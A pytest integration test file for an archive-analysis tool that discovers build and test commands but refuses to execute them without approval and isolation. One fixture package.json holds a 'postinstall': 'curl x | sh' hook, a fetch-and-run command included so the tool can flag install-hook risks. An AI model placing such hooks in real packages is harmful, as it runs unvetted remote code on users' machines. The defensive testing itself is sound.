"""Phase 4 integration: services/*, security/execution_policy, core/execution_discovery, report/UI wiring.
No real container runtime is used; isolation itself is NOT proven by these tests."""
from __future__ import annotations

import json
import zipfile
from pathlib import Path

import pytest

from core.analysis_orchestrator import analyze_archive
from core.report_generator import to_html, to_json
from security.execution_policy import DEFAULT_LIMITS, is_execution_allowed, plan_is_approved
from services.build_runner import BuildRunner
from services.environment_service import IsolationInfo, detect_isolation, tool_versions
from services.test_runner import TestRunner


def make_zip(tmp_path, files, name="p.zip"):
    p = tmp_path / name
    with zipfile.ZipFile(p, "w") as z:
        for k, v in files.items():
            z.writestr(k, v)
    return p


NODE = {"package.json": json.dumps({"name": "x", "scripts": {"test": "jest", "build": "tsc", "postinstall": "curl x | sh"}})}


@pytest.fixture
def no_runtime(monkeypatch):
    import plugins.build_execution.sandbox as sb
    monkeypatch.setattr(sb.shutil, "which", lambda _n: None)


def test_policy_fails_closed():
    assert is_execution_allowed() is False
    assert is_execution_allowed(True, False) is False and is_execution_allowed(False, True) is False
    assert is_execution_allowed(True, True) is True
    assert DEFAULT_LIMITS["network"] is False


def test_detect_isolation_unavailable_without_runtime(no_runtime):
    info = detect_isolation()
    assert isinstance(info, IsolationInfo) and info.available is False and "docker" in info.reason.lower()


def test_tool_versions_reports_missing_as_none(no_runtime):
    assert all(v is None for v in tool_versions(("docker", "node")).values())


def test_runners_split_build_and_test_and_never_guess(tmp_path):
    z = make_zip(tmp_path, NODE)
    tests = TestRunner().candidate_commands(source=z)
    builds = BuildRunner().candidate_commands(source=z)
    assert any("npm test" in c for c in tests) and not any("npm run build" in c for c in tests)
    assert any("npm run build" in c for c in builds)
    assert BuildRunner().candidate_commands([]) == []           # no source -> nothing fabricated


def test_run_refused_without_matching_approval_and_skipped_without_runtime(tmp_path, no_runtime):
    from plugins.build_execution import Approval
    z = make_zip(tmp_path, NODE)
    r = TestRunner()
    cand = r.discover(z)[0][0]
    plan = r.plan(z, cand)
    assert plan_is_approved(plan, None) is False
    refused = r.run(plan, None)
    assert refused.status == "refused" and refused.exit_code is None and refused.stdout == ""
    skipped = r.run(plan, Approval.for_plan(plan))
    assert skipped.status == "skipped" and "nothing was executed" in " ".join(skipped.notes).lower()   # no host fallback


def test_pipeline_discovers_but_never_executes(tmp_path, no_runtime):
    r = analyze_archive(make_zip(tmp_path, NODE), language_analysis=False)
    ex = r.execution
    assert ex["executed"] is False and ex["isolation"]["available"] is False
    ids = {c["id"] for c in ex["candidates"]}
    assert "node:npm-test" in ids
    assert any("postinstall" in " ".join(c["risks"]).lower() or c["risks"] for c in ex["candidates"]) or ex["notes"]
    data = json.loads(to_json(r))
    assert data["execution"]["message"].startswith("No build, test")
    html = to_html(r)
    assert "Build and test execution (Phase 4)" in html and "NOT available" in html


def test_pipeline_can_disable_discovery(tmp_path):
    r = analyze_archive(make_zip(tmp_path, {"a.py": "x=1\n"}), language_analysis=False, execution_discovery=False)
    assert r.execution is None


def test_ui_has_phase4_tabs():
    tk = pytest.importorskip("tkinter")
    try:
        root = tk.Tk()
    except tk.TclError:
        pytest.skip("no display")
    try:
        from ui.main_window import MainWindow
        mw = MainWindow(root, "reports")
        titles = [mw.nb.tab(i, "text") for i in range(mw.nb.index("end"))]
        assert "Build candidates" in titles and "Build & Test" in titles
    finally:
        root.destroy()
